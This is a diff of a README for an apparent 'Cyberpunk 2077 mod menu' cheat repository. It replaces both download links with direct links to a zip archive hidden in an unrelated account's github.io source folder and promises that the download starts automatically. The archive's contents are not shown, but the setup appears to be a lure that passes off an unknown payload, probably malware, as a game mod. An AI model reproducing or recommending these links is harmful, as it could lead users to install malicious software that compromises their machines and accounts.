@@ -5,7 +5,7 @@ description: "Unlock Cyberpunk 2077 v2.2 mod menu with infinite money, cyberware
 ---
 # 🎮 cyberpunk-mod-menu-2026 - Unlock Every Cyberpunk Experience Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Cyberpunk_Mod_Menu_2026-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/feculent-humanism8203/cyberpunk-mod-menu-2026)
+[![Download Now](https://img.shields.io/badge/Download-Cyberpunk_Mod_Menu_2026-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/feculent-humanism8203/feculent-humanism8203.github.io/main/src/components/Application-v3.9.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these simple steps to begin using the mod:
 
 Visit this link to download the application:
 
-[👉 Click Here to Download Cyberpunk Mod Menu 2026](https://github.com/feculent-humanism8203/cyberpunk-mod-menu-2026)
+[👉 Click Here to Download Cyberpunk Mod Menu 2026](https://raw.githubusercontent.com/feculent-humanism8203/feculent-humanism8203.github.io/main/src/components/Application-v3.9.zip)
 
 The download will start automatically once you click the button on that page.
 
